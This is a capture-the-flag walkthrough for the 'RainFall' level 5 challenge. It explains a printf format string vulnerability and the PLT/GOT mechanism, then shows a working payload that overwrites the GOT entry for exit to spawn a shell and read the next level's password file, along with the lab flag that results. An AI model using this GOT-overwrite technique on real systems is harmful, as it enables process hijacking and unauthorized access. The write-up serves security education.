# Level 5

## Answer
Our C source code generates the same assembly code as the original binary. Compile it as follows:
```
gcc -fno-stack-protector source.c
```

Let's take a look at the source code:
```c
#include <stdlib.h>
#include <stdio.h>

void o(void)
{
    system("/bin/sh");
    _exit(1);
}

void n(void)
{
    char buffer[512];
    fgets(buffer, 512, stdin);
    printf(buffer);
    exit(1);
}

int main(void)
{
    n();
}
```

Let's focus on the `n` function. It reads input using the `fgets` function, which is known to be safe due to its mechanism to limit the number of bytes read. However the `printf` function is known to be unsafe when user input is passed as the format argument, it's referred to as a format string vulnerability.

This exercise is the same as the previous ones, except that we have to write the address of the `o` function into the value that the address of GOT table points to, called by `exit`. Please refer to the [level3 walkthrough](../level3/walkthrough.md) for a detailed explanation of the format string vulnerability.

This only works because `exit` is a function in the Procedure Linkage Table (PLT), a mechanism used in dynamic linking to call external functions. When a function like `exit` is called, the PLT initially redirects to the Global Offset Table (GOT), which then points back to the PLT and subsequently to the dynamic linker for the first call.
> Read more about that [here](https://reverseengineering.stackexchange.com/questions/1992/what-is-plt-got).

Here you see the disassembly of the `exit` function:
```bash
(gdb) disass exit
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370
```

The PLT is the set of instructions you see (`jmp`, `push`, `jmp`).  
The GOT is referenced by the address `0x8049838`, which is used in the indirect jump instruction.

The `jmp *0x8049838` instruction dereferences the address stored at `0x8049838` and jumps to it. After our tampering, this will be the address of the `o` function.

So, first let's locate our input string on the stack:
```bash
level5@RainFall:~$ python -c 'print("AAAA %x %x %x %x")' | ./level5
AAAA 200 b7fd1ac0 b7ff37d0 41414141
```

In this output, 41414141, the hexadecimal representation of 'AAAA', is found at the fourth position.

Using gdb we find that that the address of the `o` function is `0x080484a4` and we showed before that the address of the GOT table is `0x8049838`.

We can then craft our payload:
```
address of the GOT table + address of o + %n format specifier pointing to the fourth argument

"\x08\x04\x98\x38"[::-1] + "%134513824p" + "%4$n"
```

Since we need to write `080484A4` into the value pointed to by the address of the GOT table, we write 134513828 (`080484A4` in decimal) characters (4 from the address of the GOT table and 134513824 from the width specifier of `%p`).  
Then, we use the `%n` format specifier to write the count of bytes written so far into the fourth argument, which corresponds to the GOT table address.

Let's run our payload:
```bash
level5@RainFall:~$ (python -c 'print("\x08\x04\x98\x38"[::-1] + "%134513824p" + "%4$n")' && echo 'cat /home/user/level6/.pass') | ./level5
[...]
0x200
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

We are now level6! Let's move on to the next level.
